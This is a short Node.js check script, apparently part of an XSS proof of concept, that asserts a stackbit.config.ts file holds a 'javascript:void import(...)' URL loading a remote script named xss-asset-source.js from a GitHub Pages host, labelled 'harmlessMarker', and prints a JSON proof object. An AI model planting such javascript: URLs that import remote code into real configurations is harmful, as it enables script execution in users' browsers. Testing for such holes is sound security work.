const fs = require('fs');
const config = fs.readFileSync('stackbit.config.ts', 'utf8');
const expected = "javascript:void import('https://lmzkjmiajzj-lgtm.github.io/tests/xss-asset-source.js')";
if (!config.includes(`const harmlessMarker = \"${expected}\";`)) throw new Error('asset-source loader is not the exact isolated import');
if (!config.includes('assetSources:')) throw new Error('asset-source source missing');
if (config.includes('custom-inline-script') || config.includes('controlUrl')) throw new Error('fixture is not isolated from custom-control path');
console.log(JSON.stringify({ proof: 'asset-source-url', loader: 'remote-import-only', isolated: true }));
